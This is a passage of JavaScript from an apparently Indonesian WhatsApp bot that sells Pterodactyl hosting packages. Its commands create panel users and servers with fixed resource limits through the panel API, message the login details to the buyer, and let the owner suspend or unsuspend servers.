if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Rafathar"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "500"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await DitzzXploit.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
DitzzXploit.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DitzzXploit.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_19",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 10000, db_saldo)
break
case "srvpaket6": {
       if (cekSaldo(sender,db_saldo) < 20000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
       
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Rafathar"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await DitzzXploit.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
DitzzXploit.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DitzzXploit.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_19",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 20000, db_saldo)
break
case "srvpaket7": {
       if (cekSaldo(sender,db_saldo) < 12000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp12.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Rafathar"
let egg = global.eggsnya
let loc = global.location
let memo = "6000"
let cpu = "450"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await DitzzXploit.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
DitzzXploit.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DitzzXploit.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_19",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 12000, db_saldo)
break
case "srvpaket8": {
       if (cekSaldo(sender,db_saldo) < 13000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp13.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Rafathar"
let egg = global.eggsnya
let loc = global.location
let memo = "7000"
let cpu = "400"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await DitzzXploit.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
DitzzXploit.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DitzzXploit.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_19",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 13000, db_saldo)
break
case "srvpaket9": {
       if (cekSaldo(sender,db_saldo) < 14000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp14.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Rafathar"
let egg = global.eggsnya
let loc = global.location
let memo = "8000"
let cpu = "450"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await DitzzXploit.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
DitzzXploit.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DitzzXploit.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_19",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 14000, db_saldo)
break
case "srvpaket10": {
       if (cekSaldo(sender,db_saldo) < 15000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Rafathar"
let egg = global.eggsnya
let loc = global.location
let memo = "9000"
let cpu = "500"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await DitzzXploit.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
DitzzXploit.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DitzzXploit.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_19",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 15000, db_saldo)
break
            case 'suspend': {
            if (!isOwner) return reply(`Khusus Rafathar Offcial Aja`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/suspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
            reply('*BERHASIL SUSPEND..*')
        }
            break
            case 'unsuspend': {
            if (!isOwner) return reply(`Khusus Rafathar Offcial Aja`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/unsuspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*BERHASIL BUKA SUSPEND..*')
        }
            break
case "1gb": {
    if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "15"
let disk = "1024"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await DitzzXploit.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`DONE BY PediaBotz Official⚡

 *DONE CRATE USER + SERVER ID :* ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}
 *😎PEMILIK SERVER* : *${namaCreator}*
 

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
`
DitzzXploit.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DitzzXploit.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_19",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
𝐃𝐎𝐍𝐄 𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐂𝐄𝐊 𝐃𝐀𝐓𝐀 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐀𝐍𝐃𝐀 𝐒𝐔𝐃𝐀𝐇 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 𝐍𝐎𝐌𝐎𝐑 𝐓𝐄𝐑𝐒𝐄𝐁𝐔𝐓 ☑️
© Cs PediaBotz Official
`)

}

break
case "2gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "20"
let disk = "2050"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await DitzzXploit.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
DitzzXploit.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DitzzXploit.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_19",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "3gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "40"
let disk = "3073"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await DitzzXploit.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
DitzzXploit.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DitzzXploit.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_19",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
